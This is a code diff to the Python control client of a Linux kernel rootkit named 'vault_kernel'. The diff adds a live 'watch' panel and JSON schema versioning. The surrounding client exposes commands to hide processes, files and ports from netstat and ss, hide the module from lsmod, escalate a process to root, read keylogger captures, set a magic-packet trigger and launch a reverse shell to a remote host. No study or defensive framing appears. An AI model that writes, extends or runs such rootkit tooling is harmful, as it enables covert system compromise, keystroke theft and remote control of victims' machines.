@@ -14,6 +14,8 @@ Commands:
     hide-port <port>      Hide a TCP/UDP port from netstat, ss
     unhide-port <port>    Reveal a hidden port
     list [--json]         List all hidden items (PIDs, files, ports)
+    stats [--json]        Show module stats (version, hooks, counts)
+    watch [--interval MS] Live view of stats + hidden list (default 1000 ms)
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
@@ -40,7 +42,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.6"
+CLIENT_VERSION = "3.7"
 
 
 def _port_arg(value):
@@ -96,6 +98,16 @@ MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/back
 KEYLOG_DEFAULT_INTERVAL_MS = 500
 KEYLOG_MIN_INTERVAL_MS = 50
 
+# `watch` refresh cadence — stats change slowly; 1 s is plenty and it
+# keeps parity with the Go client's default.
+WATCH_DEFAULT_INTERVAL_MS = 1000
+
+# Version of the machine-readable output envelope shared by
+# `stats --json`, `list --json` and `doctor --json` in BOTH clients
+# (Go and Python). Bump it whenever a field changes meaning or shape;
+# additive fields keep it at 1 (v3.7 added it).
+JSON_SCHEMA_VERSION = 1
+
 
 def _interval_ms_to_seconds(ms):
     """Convert a documented-MILLISECONDS --interval into the seconds
@@ -103,6 +115,26 @@ def _interval_ms_to_seconds(ms):
     raw value as SECONDS ("--interval 500" = 8 minutes per poll,
     1000x slower than the Go client and the documented units)."""
     return max(ms, KEYLOG_MIN_INTERVAL_MS) / 1000.0
+
+
+def _ms_arg(value):
+    """argparse type for poll intervals in MILLISECONDS (`keylog
+    --interval`, `watch --interval`).  Integer text only — v3.6 used
+    float, which let `--interval nan`/`inf` reach time.sleep() and die
+    with a raw ValueError/OverflowError instead of a usage error.
+    Negative values are rejected outright; values between 0 and the
+    50 ms floor keep the documented clamp of _interval_ms_to_seconds
+    (the Go client errors below 50 instead — README documents the
+    difference)."""
+    try:
+        iv = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(
+            f"invalid interval: {value!r} (integer milliseconds)")
+    if iv < 0:
+        raise argparse.ArgumentTypeError(
+            f"interval must not be negative, got {iv}")
+    return iv
 
 
 def fnv1a16(word: str) -> int:
@@ -174,6 +206,39 @@ def parse_hidden_list(report: str) -> dict:
     return result
 
 
+def format_watch_panel(stats: dict, hidden: dict, interval_ms: int,
+                       refreshed_at: str) -> str:
+    """Build the full-frame text printed by `watch` on every refresh.
+
+    Pure function — the client's watch loop only clears the screen and
+    repaints — mirroring RenderWatchPanel in the Go client: stats pairs
+    sorted and column-aligned at the widest key, then the parsed
+    hidden list.  Empty sections render as "(none)" and a missing
+    stats report as "(no stats)".
+    """
+    lines = [
+        f"vault_kernel watch — refresh {interval_ms} ms — "
+        f"updated {refreshed_at} — Ctrl-C to stop",
+        "=" * 47,
+    ]
+    if not stats:
+        lines.append("stats: (no stats)")
+    else:
+        lines.append("== stats ==")
+        width = max(len(k) for k in stats)
+        for key in sorted(stats):
+            lines.append(f"{key:<{width}} : {stats[key]}")
+    lines.append("== hidden ==")
+
+    def _items(xs):
+        return ", ".join(str(x) for x in xs) if xs else "(none)"
+
+    lines.append(f"pids : {_items(hidden.get('pids', []))}")
+    lines.append(f"files: {_items(hidden.get('files', []))}")
+    lines.append(f"ports: {_items(hidden.get('ports', []))}")
+    return "\n".join(lines) + "\n"
+
+
 def _proc_euid(pid):
     """Effective uid of pid read from /proc/<pid>/status, or None."""
     try:
@@ -201,7 +266,8 @@ def run_doctor(as_json=False):
     read-only control interface. Exits non-zero only when the module
     is unreachable; warnings do not fail. With as_json=True prints a
     single JSON document instead of text."""
-    rep = {"client_version": CLIENT_VERSION, "warnings": 0}
+    rep = {"schema": JSON_SCHEMA_VERSION, "client_version": CLIENT_VERSION,
+           "warnings": 0}
 
     def say(fmt, *a):
         if not as_json:
@@ -447,7 +513,9 @@ class VaultKernelClient:
         if self._ioctl(IOCTL_LIST_HIDDEN, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
             if as_json:
-                print(json.dumps(parse_hidden_list(output), indent=2))
+                payload = {"schema": JSON_SCHEMA_VERSION,
+                           **parse_hidden_list(output)}
+                print(json.dumps(payload, indent=2))
             else:
                 print(output if output else "(nothing hidden)")
         self._close()
@@ -530,6 +598,36 @@ class VaultKernelClient:
             print("[-] Module visible again in lsmod")
         self._close()
 
+    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS):
+        """Live view: clear the screen and repaint stats + hidden list
+        every interval_ms until Ctrl-C.  Rendering lives in
+        format_watch_panel (pure, unit-tested); this loop only owns the
+        refresh cadence and console cursor restoration."""
+        self._open()
+        try:
+            print("\x1b[?25l", end="", flush=True)  # hide cursor
+            while True:
+                stats_buf = bytearray(4096)
+                if not self._ioctl(IOCTL_GET_STATS, stats_buf):
+                    return
+                list_buf = bytearray(4096)
+                if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
+                    return
+                stats = parse_stats_report(
+                    stats_buf.rstrip(b'\x00').decode(errors='replace'))
+                hidden = parse_hidden_list(
+                    list_buf.rstrip(b'\x00').decode(errors='replace'))
+                panel = format_watch_panel(
+                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"))
+                # ANSI: clear screen + home cursor, then the frame.
+                print("\x1b[2J\x1b[H" + panel, end="", flush=True)
+                time.sleep(_interval_ms_to_seconds(interval_ms))
+        except KeyboardInterrupt:
+            print("\n[*] watch stopped")
+        finally:
+            print("\x1b[?25h", end="", flush=True)  # show cursor
+            self._close()
+
     def reset(self):
         """Clear every hidden file, PID and port in one shot."""
         self._open()
@@ -570,7 +668,7 @@ class VaultKernelClient:
                 raw = parse_stats_report(output)
                 if not raw:
                     raise SystemExit("[-] module returned an empty stats report")
-                out = {}
+                out = {"schema": JSON_SCHEMA_VERSION}
                 for key, value in raw.items():
                     try:
                         out[key] = int(value)
@@ -632,6 +730,12 @@ def main():
     sp.add_argument("--json", action="store_true", dest="as_json",
                     help="emit stats as machine-readable JSON")
 
+    sp = subparsers.add_parser(
+        "watch", help="Live view of stats + hidden list (Ctrl-C to stop)")
+    sp.add_argument("--interval", type=_ms_arg,
+                    default=WATCH_DEFAULT_INTERVAL_MS, metavar="MS",
+                    help="refresh interval in ms (default 1000, min 50)")
+
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
     sp.add_argument("target", help="IP:PORT for reverse shell")
 
@@ -645,7 +749,7 @@ def main():
     sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
     sp.add_argument("--follow", action="store_true",
                     help="stream new keystrokes until Ctrl-C")
-    sp.add_argument("--interval", type=float,
+    sp.add_argument("--interval", type=_ms_arg,
                     default=KEYLOG_DEFAULT_INTERVAL_MS, metavar="MS",
                     help="poll interval in ms for --follow (default 500, min 50)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
@@ -687,6 +791,10 @@ def main():
             client.list_hidden(as_json=args.as_json)
         elif args.command == "stats":
             client.stats(as_json=args.as_json)
+        elif args.command == "watch":
+            # --interval is documented in ms (like the Go client);
+            # _interval_ms_to_seconds clamps to the 50 ms floor.
+            client.watch(interval_ms=args.interval)
         elif args.command == "shell":
             client.shell(args.target)
         elif args.command == "magic":
